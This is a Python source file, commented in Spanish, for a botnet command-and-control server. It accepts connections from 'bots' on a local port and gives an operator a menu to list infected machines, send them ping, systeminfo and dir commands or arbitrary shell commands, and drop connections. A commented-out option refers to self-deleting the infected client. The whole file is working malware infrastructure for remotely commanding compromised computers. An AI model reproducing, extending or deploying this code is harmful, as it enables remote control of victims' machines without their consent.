import socket
import threading

HOST = "127.0.0.1"  # IP del servidor C&C
PORT = 9999  # Puerto que escucha el servidor C&C
bots = []
bot_ids = {}

def manejar_bot(conn, addr, bot_id):
    print(f"Bot {bot_id} conectado desde {addr}")
    while True:
        try:
            # Recibir mensaje del bot (puede ser un comando o información)
            data = conn.recv(4096)  # Aumentar el tamaño del buffer para recibir más datos
            if not data:
                break

            print(f"Mensaje recibido de {addr}: {data.decode('utf-8', errors='ignore')}")

        except Exception as e:
            print(f"Error con {addr}: {e}")
            break
    
    conn.close()
    bots.remove(conn)
    del bot_ids[conn]
    print(f"Bot {bot_id} desconectado")

def servidor_CnC():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"Escuchando en {HOST}:{PORT}...")

    # Crear un hilo para aceptar conexiones entrantes (bots)
    threading.Thread(target=aceptar_conexiones, args=(server,)).start()

    while True:
        print("\nMenú Principal:")
        print("1. Listar bots conectados")
        print("2. Dar órdenes a los bots")
        print("3. Cerrar conexión de los bots")
        # print("4. Autoborrar cliente infectado")  # Opción comentada
        print("5. Salir de la consola")
        opcion = input("Seleccione una opción: ")

        if opcion == "1":
            listar_bots()
        elif opcion == "2":
            dar_ordenes()
        elif opcion == "3":
            cerrar_conexion_bots()
        elif opcion == "5":
            print("Saliendo de la consola...")
            break
        else:
            print("Opción no válida. Intente de nuevo.")

def aceptar_conexiones(server):
    bot_id = 1
    while True:
        # Aceptar conexiones entrantes (bots)
        conn, addr = server.accept()
        bots.append(conn)
        bot_ids[conn] = bot_id
        # Crear un hilo para manejar cada bot conectado
        threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()
        bot_id += 1

def listar_bots():
    if bots:
        print("\nBots conectados:")
        for bot in bots:
            print(f"Bot {bot_ids[bot]}: {bot.getpeername()}")
    else:
        print("No hay bots conectados.")

def dar_ordenes():
    if not bots:
        print("No hay bots conectados.")
        return

    listar_bots()
    bot_id = int(input("Seleccione el ID del bot al que quiere dar órdenes: "))
    bot = next((b for b in bots if bot_ids[b] == bot_id), None)
    if not bot:
        print("ID de bot no válido.")
        return

    print("\nÓrdenes disponibles:")
    print("1. Hacer PING a una dirección específica")
    print("2. Comando personalizado")
    print("3. Obtener información del sistema")
    print("4. Listar archivos en el directorio actual")
    orden = input("Seleccione una orden: ")

    if orden == "1":
        direccion = input("Ingrese la dirección a hacer PING: ")
        bot.send(f"ping {direccion}".encode('utf-8'))
    elif orden == "2":
        comando = input("Ingrese el comando personalizado: ")
        bot.send(comando.encode('utf-8'))
    elif orden == "3":
        bot.send("systeminfo".encode('utf-8'))
    elif orden == "4":
        bot.send("dir".encode('utf-8'))
    else:
        print("Orden no válida.")

def cerrar_conexion_bots():
    if not bots:
        print("No hay bots conectados.")
        return

    listar_bots()
    bot_id = int(input("Seleccione el ID del bot cuya conexión quiere cerrar: "))
    bot = next((b for b in bots if bot_ids[b] == bot_id), None)
    if not bot:
        print("ID de bot no válido.")
        return

    bot.close()
    bots.remove(bot)
    del bot_ids[bot]
    print(f"Conexión con el bot {bot_id} cerrada.")

if __name__ == "__main__":
    servidor_CnC()